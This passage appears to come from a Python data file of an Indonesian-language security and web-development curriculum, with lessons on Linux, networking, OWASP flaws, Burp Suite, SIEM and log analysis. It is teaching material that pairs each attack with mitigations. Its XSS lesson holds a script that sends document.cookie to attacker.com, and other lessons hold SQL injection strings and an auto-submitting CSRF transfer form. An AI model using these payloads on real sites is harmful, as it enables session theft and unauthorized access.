             "Gunakan library seperti TanStack Query (React Query) untuk manajemen caching API di frontend."),

            ("Konfigurasi CORS & Environment Variables",
             "Mengamankan kredensial server (`.env`) dan mengatur izin akses domain lintas asal (CORS).",
             "Mencegah kebocoran API Key rahasia dan memblokir request dari domain berbahaya.",
             "javascript",
             "// Backend config\nrequire('dotenv').config();\nconst cors = require('cors');\n\napp.use(cors({\n  origin: process.env.CLIENT_URL || 'http://localhost:3000',\n  credentials: true\n}));",
             "- `.env`: File rahasia berisi password database, JWT secret, dan API key eksternal.\n- `process.env`: Cara Node.js mengakses variabel lingkungan sistem (Environment Variables).",
             "Jangan pernah meng-commit file `.env` ke dalam repository Git; selalu daftarkan ke `.gitignore`."),

            ("Autentikasi End-to-End dengan Token",
             "Mengimplementasikan alur login, penerimaan token JWT, dan pengiriman token pada setiap request API.",
             "Menjaga sesi pengguna tetap terhubung dengan aman di seluruh halaman aplikasi web.",
             "javascript",
             "// Auth Header di Client Request\nconst token = localStorage.getItem('authToken');\nconst res = await fetch('/api/v1/profile', {\n  headers: {\n    'Authorization': `Bearer ${token}`,\n    'Content-Type': 'application/json'\n  }\n});",
             "- Authorization Header: Standar pengiriman token mengggunakan skema `Bearer <token>`.\n- Protected Routes: Memverifikasi keabsahan token sebelum memberi akses halaman khusus.",
             "Pertimbangkan menggunakan HTTP-Only Cookies dibanding localStorage untuk menyimpan token JWT."),

            ("Deployment Fullstack App ke Cloud",
             "Langkah-langkah menyebar aplikasi Fullstack ke platform cloud seperti Vercel dan Render/Railway.",
             "Membuat aplikasi web-mu dapat diakses secara publik oleh seluruh pengguna di dunia 24/7.",
             "bash",
             "# 1. Deploy Frontend ke Vercel\nnpx vercel --prod\n\n# 2. Set Environment Variable di Dashboard Cloud\nDATABASE_URL=postgresql://user:pass@ep-cool-cloud.postgres.database.azure.com/dbname",
             "- Production Build: Mengompilasi kode React/Next.js menjadi bundel aset statis teroptimasi.\n- Managed PostgreSQL: Menggunakan layanan database cloud terkelola (Supabase/Neon).",
             "Pastikan selalu mengonfigurasi variabel lingkungan (Environment Variables) di dashboard hosting cloud."),
        ],

        # =====================================================================
        # CYBERSECURITY
        # =====================================================================
        "Linux Basics": [
            ("Terminal & Command Line Fundamentals",
             "Terminal ibarat kokpit pesawat; semua kontrol pesawat bisa diakses lewat perintah ketikan teks.",
             "Sistem operasi server dunia dan tools keamanan siber berbasiskan baris perintah (CLI Linux).",
             "bash",
             "# Mengetahui lokasi folder & melihat isi directory\npwd\nls -la\n\n# Membuat folder baru & berpindah direktori\nmkdir -p workspace/cybersec\ncd workspace/cybersec",
             "- `pwd` (Print Working Directory): Menampilkan jalur folder aktif saat ini.\n- `ls -la`: Menampilkan seluruh daftar file termasuk file tersembunyi (dotfiles) beserta detail izinnya.\n- `mkdir -p`: Membuat folder beserta parent direktori jika belum ada.",
             "Gunakan tombol `Tab` di keyboard untuk melengkapi nama file/folder secara otomatis (autocomplete)."),

            ("Navigasi & Manajemen File Linux",
             "Perintah memindahkan, menyalin, membaca, dan menghapus file dari terminal Linux.",
             "Mengelola file konfigurasi server dan laporan analisis keamanan dengan cepat.",
             "bash",
             "# Menyalin dan memindahkan file\ncp config.conf config.conf.bak\nmv log.txt /var/log/custom/\n\n# Membaca isi file dari terminal\ncat /etc/os-release\nhead -n 20 /var/log/sysmon.log",
             "- `cp`: Menyalin file atau folder ke lokasi baru.\n- `mv`: Memindahkan file atau mengganti nama file (rename).\n- `cat`/`head`: Membaca seluruh atau beberapa baris pertama file teks.",
             "Berhati-hatilah saat menggunakan `rm -rf`; perintah ini menghapus direktori beserta isinya tanpa konfirmasi!"),

            ("Permissions, Users & Privileges",
             "Aturan izin akses Linux mengatur siapa yang boleh Baca (Read), Tulis (Write), dan Eksekusi (Execute).",
             "Memastikan keamanan sistem agar pengembang biasa tidak merusak konfigurasi sistem inti.",
             "bash",
             "# Mengubah Izin Akses File (Read=4, Write=2, Execute=1)\nchmod 755 script.sh\n\n# Mengubah Pemilik File & Menjalankan Perintah Root\nchown root:root secret.key\nsudo systemctl restart nginx",
             "- `chmod 755`: Owner punya hak penuh (7), Group dan Others hanya bisa membaca & mengeksekusi (5).\n- `sudo`: Menjalankan satu perintah khusus dengan hak akses tertinggi (Superuser/Root).",
             "Jangan pernah menggunakan `chmod 777` di lingkungan produksi karena memberi hak tulis bebas pada siapa saja."),

            ("Bash Automation Scripting untuk Security",
             "Menulis skrip Bash sederhana untuk mengotomatisasi tugas berulang seperti pengumpulan informasi.",
             "Menghemat waktu analis keamanan saat melakukan inspeksi berkala pada banyak server.",
             "bash",
             "#!/bin/bash\n# Skrip Pemantau Server Sederhana\nTARGET_IP=\"192.168.1.1\"\n\necho \"[+] Memeriksa konektivitas ke $TARGET_IP...\"\nif ping -c 1 $TARGET_IP > /dev/null; then\n  echo \"[OK] Host Aktif\"\nelse\n  echo \"[ALERT] Host Tidak Merespon!\"\nfi",
             "- `#!/bin/bash`: Shebang line yang menentukan penerjemah skrip di sistem Linux.\n- Variable (`TARGET_IP`): Menyimpan data string yang dipanggil dengan tanda `$`.\n- Conditional (`if...fi`): Memeriksa status keberhasilan eksekusi perintah.",
             "Berikan izin eksekusi (`chmod +x script.sh`) sebelum menjalankan skrip bash."),
        ],

        "Networking Fundamentals": [
            ("Model Referensi OSI & TCP/IP",
             "Model OSI adalah kerangka 7 lapisan yang menjelaskan bagaimana data berjalan dari aplikasi ke kabel jaringan.",
             "Dasar utama bagi pakar keamanan siber untuk menganalisis lokasi terjadinya gangguan atau peretasan.",
             "text",
             "7 LAPISAN MODEL OSI:\n7. Application (HTTP, DNS, SSH)\n6. Presentation (SSL/TLS, JPEG)\n5. Session (NetBIOS, RPC)\n4. Transport (TCP, UDP)\n3. Network (IP, ICMP)\n2. Data Link (MAC, Ethernet)\n1. Physical (Kabel UTP, Fiber, Signal)",
             "- Transport Layer: Mengatur pengiriman paket data terpercaya (TCP) atau cepat (UDP).\n- Network Layer: Mengatur pengalamatan logis (IP Address) dan rute perjalanan paket.",
             "Pahami perbedaan TCP (Handshake 3 arah) dan UDP (Connectionless) untuk analisis lalu lintas jaringan."),

            ("Protokol Jaringan Utama (HTTP, DNS, SSH, FTP)",
             "Protokol adalah aturan standar yang disepakati komputer untuk saling berkomunikasi.",
             "Mengetahui cara kerja setiap protokol membantu mengidentifikasi penyalahgunaan atau celah keamanan.",
             "text",
             "PORT STANDAR PROTOKOL:\n- Port 80   : HTTP (Unencrypted Web)\n- Port 443  : HTTPS (Encrypted Web SSL/TLS)\n- Port 53   : DNS (Domain Name Resolution)\n- Port 22   : SSH (Secure Remote Shell)\n- Port 21   : FTP (File Transfer Protocol)",
             "- DNS (Domain Name System): Penerjemah nama domain (google.com) menjadi IP address (142.250.x.x).\n- SSH (Secure Shell): Protokol terenkripsi untuk mengendalikan server dari jarak jauh.",
             "Selalu utamakan penggunaan protokol terenkripsi (HTTPS/SSH) dibanding protokol polos (HTTP/Telnet)."),

            ("Pengalamatan IP & Subnetting",
             "IP Address adalah nomor rumah unik komputer di jaringan, sedangkan Subnetting mengatur batasan wilayahnya.",
             "Memungkinkan perancangan segmentasi jaringan yang aman dan efisien.",
             "text",
             "FORMAT IPv4 & SUBNET MASK:\n- IP Address : 192.168.1.50\n- Subnet Mask: 255.255.255.0 (/24)\n- Network ID : 192.168.1.0\n- Broadcast  : 192.168.1.255\n- Total Host : 254 Komputer",
             "- CIDR Notation (`/24`): Cara singkat menuliskan jumlah bit prefix subnet mask.\n- Private IP Ranges: 10.0.0.0/8, 172.16.0.0/12, dan 192.168.0.0/16.",
             "Gunakan subnetting untuk memisahkan jaringan server sensitif dari jaringan Wi-Fi tamu."),

            ("Dasar Port Scanning dengan Nmap",
             "Nmap ibarat mengetuk semua pintu rumah di satu kompleks untuk melihat pintu mana yang terbuka.",
             "Digunakan oleh penetration tester dan administrator untuk mendata layanan aktif pada target server.",
             "bash",
             "# 1. Scan Port Standar & Versi Layanan\nnmap -sV 192.168.1.100\n\n# 2. Aggressive Scan (OS Detection, Scripting, Traceroute)\nnmap -A -p 1-1000 192.168.1.100",
             "- `-sV`: Mengidentifikasi versi spesifik perangkat lunak yang berjalan di setiap port terbuka.\n- `-p 1-1000`: Membatasi scanning hanya pada port 1 hingga 1000.",
             "Hanya lakukan port scanning pada server milik sendiri atau target yang telah memberikan izin resmi (Rules of Engagement)."),
        ],

        "OWASP Top 10": [
            ("SQL Injection (SQLi) & Mitigasi",
             "SQLi terjadi ketika input pengguna yang tidak disanitasi disisipkan langsung ke dalam query SQL database.",
             "Dapat menyebabkan peretas membaca, mengubah, atau menghapus seluruh data rahasia di database.",
             "sql",
             "-- Input Pengguna Berbahaya: ' OR '1'='1\n-- Query Terdistorsi:\nSELECT * FROM users WHERE username = '' OR '1'='1' AND password = '';\n\n-- MITIGASI: Prepared Statement (Parameterized Query)\nSELECT * FROM users WHERE username = $1 AND password = $2;",
             "- Vulnerable Query: Penggabungan string SQL mentah memicu manipulasi logika query.\n- Parameterized Query: Memisahkan instruksi SQL dari data input sehingga input diidentifikasi murni sebagai string.",
             "Gunakan ORM atau Parameterized Queries (Prepared Statements) untuk menangkal 100% serangan SQL Injection dasar."),

            ("Cross-Site Scripting (XSS) Types & Defence",
             "XSS terjadi ketika penyerang menyisipkan kode JavaScript jahat yang dieksekusi di browser korban.",
             "Dapat mencuri session cookie, token login, atau melakukan kejahatan atas nama korban.",
             "html",
             "<!-- Reflected / Stored XSS Payload -->\n<script>\n  fetch('http://attacker.com/steal?cookie=' + document.cookie);\n</script>\n\n<!-- MITIGASI: HTML Entity Encoding -->\n&lt;script&gt;fetch(...)&lt;/script&gt;",
             "- Stored XSS: Script jahat tersimpan permanen di database (misal di kolom komentar).\n- Reflected XSS: Script jahat terpantul langsung dari parameter URL HTTP request.",
             "Encode seluruh keluaran data dinamis sebelum ditampilkan di HTML dan gunakan Content Security Policy (CSP)."),

            ("Broken Access Control & IDOR",
             "IDOR (Insecure Direct Object Reference) terjadi saat sistem gagal memverifikasi wewenang akses pengguna.",
             "Memungkinkan pengembang atau peretas mengakses data pengguna lain hanya dengan mengganti ID pada URL.",
             "javascript",
             "// VULNERABLE ROUTE (Tanpa Otorisasi Pemilik Data)\napp.get('/api/documents/:docId', async (req, res) => {\n  const doc = await Document.findById(req.params.docId);\n  res.json(doc); // Bahaya! Siapapun bisa ganti :docId di URL\n});\n\n// SECURE IMPLEMENTATION\napp.get('/api/documents/:docId', async (req, res) => {\n  const doc = await Document.findOne({ id: req.params.docId, ownerId: req.user.id });\n  if (!doc) return res.status(404).json({ error: 'Dokumen tidak ditemukan' });\n  res.json(doc);\n});",
             "- IDOR: Celah akibat mempercayai parameter ID dari client tanpa memeriksa hak kepemilikan data.\n- Secure Verification: Selalu cocokkan ID dokumen dengan ID pengguna yang terautentikasi (`req.user.id`).",
             "Jangan pernah mengandalkan kerahasiaan URL atau ID acak sebagai pengganti otorisasi."),

            ("Cross-Site Request Forgery (CSRF) & Tokens",
             "CSRF mengelabui browser korban agar mengirimkan request berbahaya tanpa disadari ke web tempat korban login.",
             "Dapat mengubah email, password, atau melakukan transfer uang tanpa persetujuan korban.",
             "html",
             "<!-- Formulir Jahat di Web Attacker -->\n<form action=\"https://bank.com/transfer\" method=\"POST\">\n  <input type=\"hidden\" name=\"to\" value=\"attacker_acc\">\n  <input type=\"hidden\" name=\"amount\" value=\"1000000\">\n</form>\n<script>document.forms[0].submit();</script>",
             "- CSRF Mechanism: Memanfaatkan kebiasaan browser yang otomatis melampirkan Cookie pada request antar-domain.\n- Anti-CSRF Token: Token acak unik yang wajib disertakan dalam setiap formulir perubahan data.",
             "Gunakan atribut `SameSite=Strict` atau `SameSite=Lax` pada Cookie dan pasang Anti-CSRF Token."),
        ],

        "Burp Suite & Web Hacking": [
            ("Setup Proxy Burp Suite & Intercepting Request",
             "Burp Suite adalah alat Proxy pemotong lalu lintas data antara browser dan server target.",
             "Alat wajib bagi Penetration Tester untuk melihat dan memodifikasi isi request sebelum sampai ke server.",
             "text",
             "ALUR PENGGUNAAN BURP PROXY:\n1. Atur Listener Burp Suite pada 127.0.0.1:8080\n2. Pasang Sertifikat CA Burp di Browser (FoxyProxy)\n3. Aktifkan Intercept: ON\n4. Klik tombol di web -> Request tertahan di Burp Proxy\n5. Edit isi parameter/header -> Klik Forward",
             "- Intercept: Menahan sementara paket HTTP data agar dapat diinspeksi secara manual.\n- CA Certificate: Sertifikat agar Burp Suite dapat mendeskripsi lalu lintas HTTPS terenkripsi.",
             "Gunakan ekstensi browser seperti FoxyProxy untuk mengaktifkan proxy Burp Suite dalam satu klik."),

            ("Analyzing & Modifying Traffic dengan Repeater",
             "Burp Repeater memungkinkan kamu mengedit dan mengirim ulang request HTTP berkali-kali dengan cepat.",
             "Sangat berguna untuk menguji respon server terhadap berbagai payload manipulasi data.",
             "text",
             "LANGKAH KERJA REPEATER:\n1. Pilih request dari HTTP History -> Klik kanan 'Send to Repeater' (Ctrl+R)\n2. Pindah ke tab Repeater\n3. Ubah header, Cookie, atau body JSON\n4. Klik 'Send' -> Amati respon di panel sebelah kanan",
             "- Repeatability: Pengujian berulang tanpa perlu mengisi ulang formulir di browser.\n- Response Inspector: Membandingkan perbedaan waktu dan status code respon.",
             "Manfaatkan tab Repeater untuk membedah perilaku sistem saat menerima input yang tidak valid."),

            ("Automated Attacks & Fuzzing dengan Intruder",
             "Burp Intruder mengotomatisasi pengiriman ratusan request dengan daftar kata kustom (wordlist).",
             "Digunakan untuk brute-force password, mendata parameter tersembunyi, atau fuzzing celah keamanan.",
             "text",
             "TIPE SERANGAN INTRUDER:\n- Sniper      : Menguji 1 posisi payload secara bergantian.\n- Battering Ram: Mengisi payload yang sama ke banyak posisi sekaligus.\n- Pitchfork   : Menggunakan wordlist berbeda untuk posisi berbeda secara sejajar.\n- Cluster Bomb: Mencoba seluruh kombinasi dari multiple wordlists.",
             "- Fuzzing: Mengirimkan karakter khusus (seperti `'`, `\"`, `<`, `>`) secara otomatis untuk memicu error server.\n- Payload Sets: Daftar kata kunci (wordlist) yang dimasukkan ke target posisi.",
             "Perhatikan jumlah request yang dikirim agar tidak membuat server target meledak atau mengalami DoS."),

            ("Menyusun Laporan Kerentanan Pentest",
             "Hasil uji penetrasi tidak ada artinya tanpa laporan profesional yang menjelaskan dampak dan solusinya.",
             "Menyampaikan temuan keamanan teknis kepada manajemen dan pengembang dalam bahasa yang terstruktur.",
             "markdown",
             "## [HIGH] SQL Injection pada Endpoint Login\n- **CVSS Score**: 8.9 (High)\n- **Deskripsi**: Parameter `username` tidak disanitasi sehingga memicu manipulasi query SQL.\n- **Langkah Reproduksi**: Send POST request ke `/login` dengan payload `' OR 1=1--`.\n- **Rekomendasi Remediasi**: Gunakan Prepared Statements / Parameterized Queries pada kode backend.",
             "- Executive Summary: Ringkasan singkat untuk jajaran direksi/manajemen tanpa bahasa terlalu teknis.\n- Technical Details & PoC: Bukti tangkapan layar dan payload untuk diverifikasi oleh tim pengembang.",
             "Berikan langkah remediasi yang jelas dan praktis untuk setiap kerentanan yang kamu laporkan."),
        ],

        "Networking Basics": [
            ("Pengenalan Analisis Traffic & Wireshark",
             "Wireshark ibarat mikroskop yang memperbesar dan memperlihatkan setiap paket data yang melintasi kabel jaringan.",
             "Alat bantu utama SOC Analyst untuk mendeteksi serangan jaringan dan malfungsi sistem.",
             "text",
             "TAMPILAN UTAMA WIRESHARK:\n1. Packet List Pane   : Daftar seluruh paket (No, Time, Source, Destination, Protocol)\n2. Packet Details Pane: rincian header protokol per lapisan OSI\n3. Packet Bytes Pane  : Data mentah dalam format Hexadecimal dan ASCII",
             "- Capture Filter: Menyaring paket data saat perekaman dimulai (`host 192.168.1.1`).\n- Display Filter: Menyaring paket data setelah direkam (`http || dns`).",
             "Hati-hati saat menyimpan file pcap; file rekaman bisa berukuran sangat besar jika jaringan padat."),

            ("Inspeksi Packet & Protocol Headers",
             "Membedah isi header TCP, IP, dan HTTP untuk menemukan ketidakwajaran dalam lalu lintas komunikasi.",
             "Memungkinkan pengenal identitas sumber serangan meskipun penyerang mencoba memalsukan data.",
             "text",
             "HEADER ELEMEN PENTING:\n- IP Header   : Source IP, Destination IP, TTL (Time to Live)\n- TCP Header  : Source Port, Dest Port, Sequence Number, Flags (SYN, ACK, FIN, RST)\n- HTTP Header : User-Agent, Host, Cookie, Request Method",
             "- TCP Flags (SYN/ACK): Bendera yang digunakan dalam proses permulaan koneksi (3-Way Handshake).\n- TTL (Time To Live): Angka penanda yang berkurang tiap melewati router, berguna mendeteksi OS.",
             "Perhatikan bendera `RST` (Reset) yang berlebihan karena bisa menandakan adanya pemutusan koneksi paksa."),

            ("Identifikasi Network Anomaly & Scan Attack",
             "Mengenali pola lalu lintas abnormal seperti Port Scanning, SYN Flood, dan ARP Spoofing.",
             "Mendeteksi tahap awal pemetaan musuh sebelum mereka melancarkan serangan utama.",
             "text",
             "INDIKATOR ANOMALI JARINGAN:\n- Port Scan   : Banyak paket TCP SYN dikirim ke port berbeda dari satu IP asal dalam hitungan milidetik.\n- ARP Poisoning: Terjadi klaim duplikat alamat MAC untuk IP Gateway yang sama.\n- DNS Tunneling: Banyak request DNS dengan nama subdomain acak yang sangat panjang.",
             "- Display Filter Wireshark: `tcp.flags.syn == 1 && tcp.flags.ack == 0` untuk mendeteksi pemindaian SYN.\n- Baseline Normal: Memahami konsumsi trafik normal jaringan sebelum menentukan sebuah anomali.",
             "Buat lansiran otomatis ketika jumlah paket SYN tanpa balasan ACK melampaui ambang batas normal."),

            ("Capturing & Filtering Packet Data",
             "Menggunakan sintaks Display Filter Wireshark tingkat lanjut untuk mencari jarum di dalam tumpukan jerami.",
             "Mempercepat proses investigasi insiden siber saat menganalisis file rekaman pcap berukuran besar.",
             "text",
             "CONTOH DISPLAY FILTER PENTING WIRESHARK:\n- `ip.addr == 10.0.0.5`                : Tampilkan semua trafik IP tersebut\n- `http.request.method == \"POST\"`       : Tampilkan hanya request POST HTTP\n- `frame contains \"password\"`            : Cari teks 'password' di seluruh isi paket\n- `tcp.port == 80 || tcp.port == 443`  : Tampilkan hanya trafik web",
             "- Logical Operators: Menggabungkan filter menggunakan `&&` (AND), `||` (OR), dan `!` (NOT).\n- String Search: Pencarian berbasis kata kunci dalam muatan paket data (payload).",
             "Simpan filter favoritmu di toolbar Wireshark sebagai shortcut untuk pencarian investigasi cepat."),
        ],

        "SIEM Fundamentals": [
            ("Konsep SIEM & Sentralisasi Log",
             "SIEM (Security Information and Event Management) adalah menara pengawas yang mengumpulkan log dari seluruh server.",
             "Memungkinkan pemantauan keamanan terpusat di seluruh infrastruktur perusahaan secara real-time.",
             "text",
             "KOMPONEN UTAMA SIEM:\n1. Log Collectors / Forwarders: Agen yang mengumpulkan log dari server/firewall\n2. Log Parser & Normalizer    : Mengubah format log heterogen menjadi struktur terstandar\n3. Correlation Engine         : Menganalisis gabungan peristiwa untuk menemukan ancaman\n4. Dashboard & Alerting System: Menampilkan grafik dan mengirim notifikasi bahaya",
             "- Centralized Logging: Mengirimkan log server ke lokasi terpisah yang aman dari jangkauan peretas.\n- Log Normalization: Mengubah nama kolom yang berbeda menjadi format standar (misal `src_ip`).",
             "Pastikan zona waktu (Timezone / UTC) di seluruh server pengirim log sudah tersinkronisasi presisi."),

            ("Pengenalan SIEM Tools (Splunk / Wazuh)",
             "Pelajari dua platform SIEM populer di industri: Splunk (Enterprise) dan Wazuh (Open Source).",
             "Memberikan keterampilan praktis yang paling banyak dicari di pusat kendali keamanan (SOC).",
             "text",
             "PERBANDINGAN PLATFORM:\n- Splunk: Sangat kuat untuk analisis data besar dengan bahasa query SPL (Search Processing Language).\n- Wazuh : Solusi open-source terintegrasi dengan deteksi kerentanan dan keandalan agen Endpoint (XDR).",
             "- Wazuh Agent: Perangkat lunak ringan yang dipasang di komputer klien untuk memantau sistem.\n- Splunk Indexer: Mesin pencari dan penyimpan log berkecepatan tinggi.",
             "Manfaatkan Wazuh untuk laboratorium belajar mandiri karena sepenuhnya gratis dan open-source."),

            ("Membuat Detection Rules & Query Search",
             "Menulis query pencarian dan aturan deteksi otomatis untuk menemukan aktivitas mencurigakan.",
             "Mengubah tumpukan data log mentah menjadi informasi ancaman keamanan yang berharga.",
             "text",
             "CONTOH QUERY SPLUNK (DETEKSI BRUTE FORCE):\nindex=windows EventCode=4625\n| stats count by TargetUserName, src_ip\n| where count > 10",
             "- Windows Event 4625: Kode kejadian standar Windows untuk kegagalan proses login (Failed Logon).\n- Aggregation (`stats count`): Menghitung akumulasi percobaan login gagal berdasarkan nama user dan IP asal.",
             "Uji aturan deteksi dengan simulasi serangan nyata untuk memastikan tidak ada pemalsuan lansiran (False Positive)."),

            ("Triage & Investigasi Alert Keamanan",
             "Proses memilah dan menilai apakah lansiran keamanan merupakan ancaman asli (True Positive) atau salah sasaran.",
             "Mencegah kelelahan lansiran (Alert Fatigue) dan memastikan ancaman nyata ditangani dengan cepat.",
             "text",
             "ALUR TRIAGE INSIDEN SOC:\n1. Alert Fired     : Lansiran muncul di dashboard SIEM\n2. Verifikasi Data : Cek reputasi IP (VirusTotal) dan riwayat aktivitas user\n3. Klasifikasi     : True Positive (Ancaman Asli) vs False Positive (Aktivitas Wajar)\n4. Eskalasi / Close: Kirim ke Incident Response Team atau tutup tiket dengan catatan",
             "- True Positive: Alert berbunyi dan memang ada serangan siber nyata yang terjadi.\n- False Positive: Alert berbunyi tetapi sebenarnya hanya aktivitas normal dari karyawan.",
             "Dokumentasikan setiap analisis triage dalam tiket penanganan insiden untuk bahan pembelajaran tim."),
        ],

        "Windows & Linux Admin": [
            ("Windows Event Logs & Sysmon Deep Dive",
             "Windows Event Logs merekam seluruh kejadian di sistem operasi Windows, dan Sysmon memberikan detail ekstra.",
             "Penyedia visibilitas utama untuk melacak pergerakan penyusup di sistem operasi Windows.",
             "text",
             "EVENT ID PENTING WINDOWS:\n- Event 4624: Login Berhasil (Successful Logon)\n- Event 4625: Login Gagal (Failed Logon)\n- Event 4672: Login dengan Hak Akses Admin (Special Privileges Assigned)\n- Sysmon Event 1: Pembuatan Proses Baru (Process Creation dengan Command Line lengkap)",
             "- Logon Type 2: Login lokal fisik di depan komputer.\n- Logon Type 10: Login jarak jauh menggunakan Remote Desktop (RDP).",
             "Pasang Sysmon dengan konfigurasi dari SwiftOnSecurity untuk visibilitas kejahatan siber terbaik."),

            ("Linux Auditd, Systemd & Auth Logs",
             "Memahami tempat penyimpanan log autentikasi dan aktivitas eksekusi perintah di sistem operasi Linux.",
             "Memungkinkan pengawasan aktivitas superuser dan pendeteksian manipulasi file sistem Linux.",
             "text",
             "LOKASI LOG UTAMA LINUX:\n- /var/log/auth.log   : Log autentikasi (SSH login, penggunaan sudo) di Debian/Ubuntu\n- /var/log/secure     : Log autentikasi di RedHat/CentOS\n- /var/log/audit/audit.log: Log audit detail dari layanan Linux Auditd",
             "- Auditd: Layanan kernel Linux yang merekam setiap pemanggilan sistem (syscall) dan akses file spesifik.\n- `journalctl -u ssh`: Membaca log layanan tertentu dari Systemd journal.",
             "Pantau baris `COMMAND=` pada log auth untuk melihat perintah apa saja yang dijalankan via `sudo`."),

            ("Process Monitoring & Task Scheduler Analysis",
             "Mendeteksi metode yang digunakan peretas untuk mempertahankan aksesnya (Persistence Mechanism).",
             "Memutus jalur akses tersembunyi yang ditanamkan peretas di dalam sistem komputer.",
             "text",
             "METODE PERSISTENSI UMUM:\n- Windows: Scheduled Tasks (`schtasks`), Registry Run Keys (`HKCU\\...\\Run`), Windows Services\n- Linux  : Cron Jobs (`/etc/crontab`, `/var/spool/cron/`), Systemd Service units",
             "- `Get-ScheduledTask`: Perintah PowerShell untuk mengidentifikasi tugas terjadwal yang mencurigakan.\n- Cron format (`* * * * *`): Jadwal menit, jam, hari, bulan, dan hari dalam seminggu.",
             "Periksa direktori Startup dan Cron Jobs secara rutin untuk memastikan tidak ada skrip siluman."),

            ("User Privileges & Account Management",
             "Mengelola grup akun pengguna dan mendeteksi eskalasi hak akses ilegal di Windows dan Linux.",
             "Memastikan prinsip akses terbilang minimal (Least Privilege) diterapkan dengan disiplin tinggi.",
             "bash",
             "# Linux: Memeriksa akun dengan ID 0 (Root Privileges)\nawk -F: '($3 == 0) {print $1}' /etc/passwd\n\n# Windows PowerShell: Memeriksa anggota grup Administrators\nGet-LocalGroupMember -Group \"Administrators\"",
             "- User ID 0: Di Linux, pengguna apapun yang memiliki UID 0 dianggap sebagai pengguna Root.\n- Group Membership: Hak akses harus diberikan berdasarkan grup peran, bukan perorangan.",
             "Audit daftar anggota grup `Administrators` dan `sudoers` secara berkala minimal sebulan sekali."),
        ],

        "Log Analysis": [
            ("Menganalisis Log Web Server (Nginx / Apache)",
             "Membedah rekaman lalu lintas web server untuk menemukan jejak percobaan serangan pada aplikasi web.",
             "Langkah awal dalam merekonstruksi kronologi terjadinya pembobolan aplikasi web.",
             "text",
             "FORMAT ACCESS LOG NGINX:\n192.168.1.50 - - [22/Jul/2026:14:00:00 +0700] \"GET /admin/login.php HTTP/1.1\" 200 4502 \"-\" \"Mozilla/5.0\"\n\nJEJAK SERANGAN DI LOG:\n- SQLi : /products.php?id=1%27%20OR%201=1--\n- XSS  : /search.php?q=%3Cscript%3Ealert(1)%3C/script%3E",
             "- Status Code 200 pada URL eksploitasi: Menunjukkan bahwa serangan kemungkinan besar berhasil dilakukan.\n- User-Agent Anomali: String User-Agent berupa nama tools otomatis seperti `sqlmap` atau `python-requests`.",
             "Gunakan perintah `grep`, `awk`, dan `sort` di Linux untuk meringkas IP penyerang paling aktif."),

            ("Mendeteksi Serangan Brute Force & Suspicious Login",
             "Mengenali pola lonjakan percobaan login gagal dalam jumlah besar yang diikuti oleh login berhasil.",
             "Garda depan dalam membatalkan pengambilalihan akun pengguna (Account Takeover).",
             "text",
             "INDIKATOR BRUTE FORCE LOG:\n- Ratusan baris Event 4625 (Failed) dari IP yang sama dalam jeda beberapa detik.\n- Diakhiri oleh Event 4624 (Success) dari IP tersebut -> AKUN BERHASIL DI-BOBOL!",
             "- Password Spraying: Mencoba 1 password populer (misal `Password123!`) ke ribuan nama akun berbeda untuk menghindari lockout.\n- Account Lockout Policy: Aturan penguncian akun sementara setelah 5x kesalahan password.",
             "Gunakan korelasikan waktu antara log gagal dan sukses untuk mengonfirmasi keberhasilan penyerang."),

            ("Mendeteksi Lalu Lintas C2 & Malware Beaconing",
             "Mengenali sinyal berkala (beaconing) yang dikirim oleh malware ke server pengendali peretas (Command & Control).",
             "Memungkinkan penghentian aktivitas pencurian data (Data Exfiltration) sebelum data sensitif keluar.",
             "text",
             "KARAKTERISTIK C2 BEACONING:\n- Request HTTP/DNS terjadi secara konsisten pada interval waktu yang presisi (misal setiap 60 detik).\n- Mengirimkan data terenkripsi berukuran kecil lewat metode HTTP POST atau TXT record DNS.",
             "- Jitter: Variasi acak yang ditambahkan malware pada interval waktu untuk mengelabui alat pendeteksi.\n- Domain Generation Algorithm (DGA): Malware menghasilkan ratusan nama domain acak tiap hari.",
             "Manfaatkan analisis statistik interval waktu (Delta Time) untuk menemukan sinyal beaconing yang tersembunyi."),

            ("Menyusun Incident Report & Rekomendasi Remediasi",
             "Mengompilasi seluruh temuan investigasi log menjadi dokumen laporan resmi insiden keamanan siber.",
             "Menyediakan bukti sah kronologi kejadian dan panduan perbaikan bagi manajemen perusahaan.",
             "markdown",
             "# Laporan Insiden Keamanan #INC-2026-08\n- **Tanggal Kejadian**: 22 Juli 2026\n- **Ringkasan**: Terjadi akses tanpa izin pada Server Database akibat pembobolan kredensial SSH.\n- **Vektor Serangan**: Serangan Brute Force pada Port SSH (22) yang terbuka ke internet publik.\n- **Dampak**: 1 file cadangan database terunduh oleh pihak luar.\n- **Tindakan Perbaikan**: Matikan password login SSH, wajibkan penggunaan SSH Key & VPN.",
             "- Timeline Kejadian: Urutan kronologis rinci dari awal mula penyerang masuk hingga diisolasi.\n- Root Cause Analysis: Akar masalah utama yang menyebabkan celah dapat dieksploitasi.",
             "Sajikan rekomendasi perbaikan taktis jangka pendek dan strategis jangka panjang."),
        ],

        "Firewall & Network Security": [
            ("Arsitektur Firewall & Packet Filtering Rules",
             "Firewall adalah satpam penjaga gerbang yang memutuskan paket data mana yang boleh lewat atau ditolak.",
             "Garda pertahanan terdepan dalam melindungi perimeter jaringan komputer perusahaan.",
             "bash",
             "# Contoh Perintah Firewall Linux (iptables)\n# 1. Izinkan trafik terhubung & SSH (Port 22)\niptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\niptables -A INPUT -p tcp --dport 22 -j ACCEPT\n\n# 2. Blokir sisa trafik lainnya (Default DROP)\niptables -P INPUT DROP",
             "- Default Drop Policy: Aturan terbaik di mana semua trafik ditolak secara default kecuali yang diizinkan.\n- Rule Order: Aturan dievaluasi dari atas ke bawah; aturan yang cocok pertama kali akan langsung dieksekusi.",
             "Selalu tempatkan aturan yang paling spesifik di posisi paling atas daftar aturan (rule base)."),

            ("Segmentasi Jaringan & Konsep VLAN",
             "Membagi satu jaringan fisik menjadi beberapa zona terisolasi secara logis (VLAN).",
             "Membatasi pergerakan lateral peretas jika salah satu komputer karyawan berhasil terinfeksi malware.",
             "text",
             "ZONA SEGMENTASI JARINGAN PENTING:\n- DMZ (Demilitarized Zone) : Tempat meletakkan server publik (Web Server, Mail Server).\n- Internal Corporate Zone : Tempat komputer karyawan dan printer internal.\n- Restricted Server Zone   : Tempat server sensitif (Database, Domain Controller).\n- Guest Wi-Fi Zone         : Jaringan tamu yang terisolasi total dari internal.",
